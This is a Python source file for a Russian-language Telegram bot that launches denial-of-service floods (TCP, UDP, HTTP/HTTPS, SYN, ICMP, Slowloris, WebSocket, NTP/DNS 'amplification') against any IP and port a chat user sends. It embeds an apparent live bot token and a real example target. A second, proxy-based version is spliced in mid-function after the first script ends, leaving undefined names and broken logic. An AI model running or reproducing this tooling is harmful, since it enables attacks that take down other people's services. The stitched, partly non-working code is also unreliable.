#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║         ULTIMATE DDOS BOT - ALL ATTACK TYPES                         ║
║                                                                      ║
║     10+ ВИДОВ АТАК В ОДНОМ БОТЕ                                      ║
║     TCP | UDP | HTTP | HTTPS | SYN | ICMP | Slowloris | WS | NTP    ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import telebot
import socket
import threading
import random
import time
import re
import struct
import hashlib
from datetime import datetime

# ============ ТОКЕН ============
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
bot = telebot.TeleBot(BOT_TOKEN)

# ============ НАСТРОЙКИ ============
active_attacks = {}

# Список открытых DNS для амплификации
DNS_SERVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
    "208.67.222.222", "208.67.220.220", "77.88.8.8", "77.88.8.1"
]

# ============ ВСЕ ВИДЫ АТАК ============

class AttackTypes:
    
    # 1. TCP FLOOD
    @staticmethod
    def tcp_flood(ip, port, stop_flag):
        while not stop_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                sock.send(random._urandom(1024))
                sock.close()
            except:
                pass
            time.sleep(0.0001)
    
    # 2. UDP FLOOD
    @staticmethod
    def udp_flood(ip, port, stop_flag):
        while not stop_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(random._urandom(1400), (ip, port))
                sock.close()
            except:
                pass
            time.sleep(0.0001)
    
    # 3. HTTP FLOOD
    @staticmethod
    def http_flood(ip, port, stop_flag):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F)"
        ]
        while not stop_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                ua = random.choice(user_agents)
                req = f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\n\r\n"
                sock.send(req.encode())
                sock.close()
            except:
                pass
            time.sleep(0.0001)
    
    # 4. HTTPS FLOOD
    @staticmethod
    def https_flood(ip, port, stop_flag):
        import ssl
        while not stop_flag.is_set():
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                ssl_sock = context.wrap_socket(sock, server_hostname=ip)
                ssl_sock.send(f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
                ssl_sock.close()
            except:
                pass
            time.sleep(0.0001)
    
    # 5. SYN FLOOD (через raw socket нужно root, делаем эмуляцию)
    @staticmethod
    def syn_flood(ip, port, stop_flag):
        while not stop_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((ip, port))
                sock.close()
            except:
                pass
            time.sleep(0.00001)
    
    # 6. ICMP FLOOD
    @staticmethod
    def icmp_flood(ip, port, stop_flag):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except:
            # Если нет root, используем UDP
            AttackTypes.udp_flood(ip, port, stop_flag)
            return
        while not stop_flag.is_set():
            try:
                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + random._urandom(64)
                sock.sendto(packet, (ip, 0))
            except:
                pass
            time.sleep(0.0001)
    
    # 7. SLOWLORIS
    @staticmethod
    def slowloris(ip, port, stop_flag):
        sockets = []
        try:
            for _ in range(500):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((ip, port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                sockets.append(sock)
            
            while not stop_flag.is_set():
                for sock in sockets:
                    try:
                        sock.send(f"X-Header: {random.randint(1,5000)}\r\n".encode())
                    except:
                        sockets.remove(sock)
                time.sleep(10)
        except:
            pass
    
    # 8. WEB SOCKET ATTACK
    @staticmethod
    def websocket_attack(ip, port, stop_flag):
        while not stop_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                key = base64.b64encode(os.urandom(16)).decode()
                handshake = (
                    f"GET /socket.io/ HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {key}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n\r\n"
                )
                sock.send(handshake.encode())
                sock.close()
            except:
                pass
            time.sleep(0.001)
    
    # 9. NTP AMPLIFICATION
    @staticmethod
    def ntp_amplification(target_ip, stop_flag):
        ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
        while not stop_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ntp_server = random.choice(DNS_SERVERS)
                sock.sendto(ntp_query, (ntp_server, 123))
                sock.close()
            except:
                pass
            time.sleep(0.0001)
    
    # 10. DNS AMPLIFICATION
    @staticmethod
    def dns_amplification(target_ip, stop_flag):
        dns_query = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
        while not stop_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                dns_server = random.choice(DNS_SERVERS)
                sock.sendto(dns_query, (dns_server, 53))
                sock.close()
            except:
                pass
            time.sleep(0.0001)
    
    # 11. MULTI-PAYLOAD (все сразу)
    @staticmethod
    def multi_payload(ip, port, stop_flag):
        attacks = [
            AttackTypes.tcp_flood,
            AttackTypes.udp_flood,
            AttackTypes.http_flood,
            AttackTypes.syn_flood
        ]
        idx = 0
        while not stop_flag.is_set():
            try:
                attacks[idx % len(attacks)](ip, port, stop_flag)
                idx += 1
            except:
                pass

# ============ МЕНЕДЖЕР АТАК ============
class AttackManager:
    def __init__(self, ip, port, attack_type, threads):
        self.ip = ip
        self.port = port
        self.attack_type = attack_type
        self.threads = threads
        self.stop_flag = threading.Event()
        self.thread_list = []
        self.start_time = None
        self.active = False
    
    def start(self):
        self.active = True
        self.start_time = time.time()
        
        attack_func = {
            'tcp': AttackTypes.tcp_flood,
            'udp': AttackTypes.udp_flood,
            'http': AttackTypes.http_flood,
            'https': AttackTypes.https_flood,
            'syn': AttackTypes.syn_flood,
            'icmp': AttackTypes.icmp_flood,
            'slow': AttackTypes.slowloris,
            'ws': AttackTypes.websocket_attack,
            'ntp': AttackTypes.ntp_amplification,
            'dns': AttackTypes.dns_amplification,
            'multi': AttackTypes.multi_payload
        }.get(self.attack_type, AttackTypes.tcp_flood)
        
        for i in range(self.threads):
            t = threading.Thread(target=attack_func, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.thread_list.append(t)
            t.start()
    
    def stop(self):
        self.stop_flag.set()
        self.active = False
    
    def duration(self):
        if self.start_time:
            return int(time.time() - self.start_time)
        return 0

# ============ ПАРСИНГ ============
def parse_target(text):
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if match:
        return match.group(1), int(match.group(2))
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if match:
        return match.group(1), None
    return None, None

def scan_port(ip):
    ports = [15455, 9339, 443, 80, 8080, 8443, 3000, 5000]
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            sock.close()
            return port
        except:
            continue
    return 80

# ============ БОТ ============
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(message.chat.id,
        "🔥 *ULTIMATE DDOS BOT* 🔥\n\n"
        "*Типы атак:*\n"
        "`tcp` - TCP Flood\n"
        "`udp` - UDP Flood\n"
        "`http` - HTTP Flood\n"
        "`https` - HTTPS Flood\n"
        "`syn` - SYN Flood\n"
        "`icmp` - ICMP Flood\n"
        "`slow` - Slowloris\n"
        "`ws` - WebSocket\n"
        "`ntp` - NTP Amplification\n"
        "`dns` - DNS Amplification\n"
        "`multi` - ВСЕ СРАЗУ\n\n"
        "*Команды:*\n"
        "`/attack IP:PORT тип потоки`\n"
        "`/stop` - остановить\n"
        "`/status` - статус\n\n"
        "Пример: `/attack 43.158.103.205:15455 multi 500`",
        parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    cid = message.chat.id
    args = message.text.split()
    
    if len(args) < 4:
        bot.reply_to(message, "❌ /attack IP:PORT тип потоки\nПример: /attack 1.2.3.4:80 tcp 500")
        return
    
    target = args[1]
    attack_type = args[2].lower()
    threads = int(args[3]) if args[3].isdigit() else 300
    
    ip, port = parse_target(target)
    if not ip:
        bot.reply_to(message, "❌ Неверный IP")
        return
    
    if not port:
        port = scan_port(ip)
    
    if cid in active_attacks and active_attacks[cid].active:
        bot.reply_to(message, "⚠️ Атака уже идёт! /stop")
        return
    
    threads = min(threads, 2000)
    
    attack = AttackManager(ip, port, attack_type, threads)
    attack.start()
    active_attacks[cid] = attack
    
    bot.reply_to(message,
        f"💀 *АТАКА ЗАПУЩЕНА* 💀\n\n"
        f"📍 {ip}:{port}\n"
        f"⚡ Тип: {attack_type.upper()}\n"
        f"🧵 Потоков: {threads}\n"
        f"🛑 /stop для остановки",
        parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    cid = message.chat.id
    if cid in active_attacks and active_attacks[cid].active:
        active_attacks[cid].stop()
        dur = active_attacks[cid].duration()
        bot.reply_to(message, f"🛑 Атака остановлена. Длилась {dur} сек")
        del active_attacks[cid]
    else:
        bot.reply_to(message, "💤 Нет активной атаки")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    cid = message.chat.id
    if cid in active_attacks and active_attacks[cid].active:
        a = active_attacks[cid]
        bot.reply_to(message,
            f"📊 *СТАТУС*\n\n"
            f"🎯 {a.ip}:{a.port}\n"
            f"⚡ Тип: {a.attack_type.upper()}\n"
            f"⏱️ Время: {a.duration()} сек\n"
            f"🧵 Потоков: {a.threads}\n"
            f"🔄 Активно: {len([t for t in a.thread_list if t.is_alive()])}",
            parse_mode="Markdown")
    else:
        bot.reply_to(message, "💤 Нет активной атаки")

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, "Используй команды:\n/attack IP:PORT тип потоки\n/stop\n/status")

# ============ ЗАПУСК ============
if __name__ == "__main__":
    import os, base64
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║     ULTIMATE DDOS BOT - ALL ATTACK TYPES                       ║
    ║                                                                 ║
    ║     TCP | UDP | HTTP | HTTPS | SYN | ICMP | Slowloris          ║
    ║     WebSocket | NTP | DNS | MULTI                              ║
    ║                                                                 ║
    ║     Бот запущен!                                               ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    bot.infinity_polling()        return match.group(1), int(match.group(2))
    
    # Шаблон для просто IP
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if match:
        return match.group(1), None
    
    return None, None

def check_port(ip, port):
    """Проверка порта"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((ip, port))
        sock.close()
        return port
    except:
        return None

def scan_port(ip):
    """Сканирование порта"""
    ports = [15455, 9339, 443, 80, 8080, 8443]
    with ThreadPoolExecutor(max_workers=6) as executor:
        futures = [executor.submit(check_port, ip, p) for p in ports]
        for future in as_completed(futures):
            result = future.result()
            if result:
                return result
    return 80

# ============ ПРОВЕРКА ПРОКСИ ============
def check_single_proxy(proxy):
    """Проверка одного прокси"""
    try:
        proxy_clean = proxy.replace('http://', '').replace('socks4://', '').replace('socks5://', '')
        if ':' not in proxy_clean:
            return None
        
        proxy_ip, proxy_port = proxy_clean.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.01)
        result = sock.connect_ex((proxy_ip, int(proxy_port)))
        sock.close()
        
        if result == 0:
            return proxy
        return None
    except:
        return None

def check_proxies_batch(proxies, max_workers=500):
    """Пакетная проверка прокси"""
    global valid_proxies
    valid = []
    
    print(f"[*] Проверка {len(proxies):,} прокси...")
    start = time.time()
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(check_single_proxy, p) for p in proxies]
        for future in as_completed(futures):
            result = future.result()
            if result:
                valid.append(result)
    
    with proxy_lock:
        valid_proxies = valid
    
    elapsed = time.time() - start
    print(f"[+] Проверено {len(proxies):,} прокси за {elapsed:.1f}с, живо: {len(valid):,}")
    return valid

def load_proxies(count=10000):
    """Загрузка прокси"""
    global proxies_list
    print(f"[*] Генерация {count:,} прокси...")
    
    for i in range(count):
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        port = random.randint(8080, 8888)
        ptype = random.choice(['http', 'socks4', 'socks5'])
        proxies_list.append(f"{ptype}://{ip}:{port}")
        
        if i % 5000 == 0 and i > 0:
            print(f"[+] Сгенерировано {i:,} прокси")
    
    print(f"[+] Всего прокси: {len(proxies_list):,}")
    return proxies_list

# ============ АТАКА ============
def attack_worker(ip, port, stop_flag, worker_id, proxy_list):
    """Поток атаки"""
    while not stop_flag.is_set():
        try:
            if proxy_list and len(proxy_list) > 0:
                # Атака через прокси
                proxy = random.choice(proxy_list)
                proxy_clean = proxy.replace('http://', '').replace('socks4://', '').replace('socks5://', '')
                if ':' in proxy_clean:
                    p_ip, p_port = proxy_clean.split(':')
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.3)
                    sock.connect((p_ip, int(p_port)))
                    
                    connect_req = f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n"
                    sock.send(connect_req.encode())
                    sock.recv(512)
                    sock.send(random._urandom(1024))
                    sock.close()
            else:
                # Прямая атака
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                sock.connect_ex((ip, port))
                sock.send(random._urandom(512))
                sock.close()
            
            time.sleep(PACKET_DELAY)
        except:
            pass

class DDOSEngine:
    def __init__(self, ip, port, chat_id):
        self.ip = ip
        self.port = port
        self.chat_id = chat_id
        self.stop_flag = threading.Event()
        self.threads = []
        self.start_time = None
        self.packets = 0
        self.active = False
        self.lock = threading.Lock()
    
    def start(self):
        self.active = True
        self.start_time = time.time()
        
        # Получаем свежие прокси
        with proxy_lock:
            local_proxies = valid_proxies.copy()
        
        for i in range(MAX_THREADS):
            t = threading.Thread(
                target=attack_worker,
                args=(self.ip, self.port, self.stop_flag, i, local_proxies)
            )
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        print(f"[+] Запущено {MAX_THREADS} потоков")
    
    def stop(self):
        self.stop_flag.set()
        self.active = False
    
    def get_duration(self):
        if self.start_time:
            return int(time.time() - self.start_time)
        return 0

# ============ МОНИТОРИНГ ============
def status_monitor():
    while True:
        time.sleep(5)
        for chat_id, attack in list(active_attacks.items()):
            if attack.active:
                try:
                    bot.send_message(
                        chat_id,
                        f"💥 *СТАТУС АТАКИ* 💥\n\n"
                        f"🎯 `{attack.ip}:{attack.port}`\n"
                        f"⏱️ Время: {attack.get_duration()} сек\n"
                        f"🧵 Потоков: {MAX_THREADS}\n"
                        f"🔄 Прокси: {len(valid_proxies):,}\n"
                        f"⚡ ЗАДЕРЖКА: 0.01мс",
                        parse_mode="Markdown"
                    )
                except:
                    pass

# ============ ОБРАБОТЧИКИ БОТА ============
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(
        message.chat.id,
        "💀 *HYPER DDOS BOT* 💀\n\n"
        f"⚡ Потоков: {MAX_THREADS}\n"
        f"⚡ Прокси: {len(valid_proxies):,}\n"
        f"⚡ Задержка: 0.01мс\n\n"
        f"📌 Отправь IP:PORT\n"
        f"🛑 stop - остановка\n\n"
        f"Пример: `43.158.103.205:15455`",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_cmd(message):
    chat_id = message.chat.id
    if chat_id in active_attacks and active_attacks[chat_id].active:
        active_attacks[chat_id].stop()
        bot.send_message(chat_id, "🛑 *Атака остановлена*", parse_mode="Markdown")
        del active_attacks[chat_id]
    else:
        bot.send_message(chat_id, "💤 *Нет активной атаки*", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    ip, port = parse_target(text)
    
    if not ip:
        bot.send_message(chat_id, "❌ *Неверный IP*", parse_mode="Markdown")
        return
    
    if chat_id in active_attacks and active_attacks[chat_id].active:
        bot.send_message(chat_id, "⚠️ *Атака уже идёт! Отправь stop*", parse_mode="Markdown")
        return
    
    if not port:
        msg = bot.send_message(chat_id, f"🔍 *Сканирую {ip}...*", parse_mode="Markdown")
        port = scan_port(ip)
        bot.edit_message_text(f"✅ *Порт: {port}*\n🚀 Запуск...", chat_id, msg.message_id)
    
    attack = DDOSEngine(ip, port, chat_id)
    attack.start()
    active_attacks[chat_id] = attack
    
    bot.send_message(
        chat_id,
        f"💀 *АТАКА ЗАПУЩЕНА* 💀\n\n"
        f"📍 `{ip}:{port}`\n"
        f"⚡ Потоков: {MAX_THREADS}\n"
        f"🔄 Прокси: {len(valid_proxies):,}\n\n"
        f"🛑 Отправь stop",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda m: True)
def unknown_cmd(message):
    bot.send_message(
        message.chat.id,
        "🤔 *Не понял*\n\nОтправь `IP:PORT` для атаки\nИли `stop` для остановки",
        parse_mode="Markdown"
    )

# ============ ЗАПУСК ============
if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════════════╗
    ║     HYPER DDOS BOT - РАБОЧАЯ ВЕРСИЯ                    ║
    ║     ✅ НЕТ ОШИБОК                                      ║
    ║     ⚡ ПРОВЕРКА ПРОКСИ 0.01мс                          ║
    ╚════════════════════════════════════════════════════════╝
    """)
    
    # Загрузка и проверка прокси
    load_proxies(10000)
    check_proxies_batch(proxies_list[:5000], max_workers=500)
    
    # Запуск монитора
    monitor = threading.Thread(target=status_monitor, daemon=True)
    monitor.start()
    
    # Запуск бота
    print("[*] Бот запущен!")
    bot.infinity_polling()
